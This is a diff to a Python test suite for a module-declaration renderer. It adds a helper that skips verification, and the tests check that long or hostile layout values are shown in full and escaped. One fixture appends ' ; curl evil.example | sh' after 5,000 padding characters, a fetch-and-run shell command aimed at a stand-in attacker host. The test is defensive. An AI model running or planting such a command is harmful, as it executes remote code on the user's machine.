@@ -69,6 +69,11 @@ class Base(unittest.TestCase):
     def render(self, name, **kwargs):
         return request.render_module("sample", self.loaded()[name], self.hashes_for(name), **kwargs)
 
+    def render_declared(self, name):
+        # The declaration as loaded, without module verification, which refuses a layout that
+        # does not follow the layout rules; the request must still show whatever it is given.
+        return request.render_module("sample", self.loaded()[name], Hashes)
+
 
 class CleanTest(unittest.TestCase):
     def test_control_and_hostile_characters_become_visible_escapes(self):
@@ -220,14 +225,14 @@ class NothingIsHiddenTest(Base):
     def test_a_long_layout_value_is_shown_to_its_end(self):
         tail = " ; curl evil.example | sh"
         self.edit("sample-harness", layout={"hooks": {"pre": "echo " + "A" * 5000 + tail}})
-        text = self.render("sample-harness")
+        text = self.render_declared("sample-harness")
         self.assertIn(tail, text)
         self.assertIn("A" * 5000, text)
         self.assertNotIn("...", text)
 
     def test_layout_is_one_line_per_leaf_with_a_path(self):
         self.edit("sample-harness", layout={"hooks": {"pre": "a", "post": ["b", "c"]}, "root": "r"})
-        text = self.render("sample-harness")
+        text = self.render_declared("sample-harness")
         for expected in ('hooks.post[0] = "b"', 'hooks.post[1] = "c"', 'hooks.pre = "a"',
                          'root = "r"'):
             self.assertIn("    " + expected, text)
@@ -298,7 +303,7 @@ class HostileTextTest(Base):
 
     def test_hostile_layout_values_from_a_real_declaration_stay_on_one_line(self):
         self.edit("sample-harness", layout={"root": JSON_HOSTILE, "hooks": [JSON_HOSTILE]})
-        text = self.render("sample-harness")
+        text = self.render_declared("sample-harness")
         self.assertTrue(only_plain_ascii(text))
         self.assertEqual([line for line in text.splitlines() if line.startswith("fake")], [])
 
